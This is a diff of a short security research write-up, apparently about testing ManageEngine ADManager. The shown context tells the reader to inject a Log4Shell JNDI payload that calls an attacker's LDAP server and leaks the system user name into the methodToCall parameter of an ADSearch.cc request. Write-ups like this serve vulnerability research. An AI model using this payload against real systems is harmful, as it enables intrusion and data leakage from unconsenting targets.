@@ -8,7 +8,7 @@ First, Let’s make a login request using  proxy.
 
 ![](https://raw.githubusercontent.com/channyein1337/research/main/images/admanager.png)
 
-Inject the following payload in the methodToCall parameter in the [ADSearch.cc](http://ADSearch.cc) request.
+Inject the following payload in the ```methodToCall``` parameter in the ```ADSearch.cc``` request.
 
 ```
 ${jndi:ldap://${sys:user.name}.<your-server>}
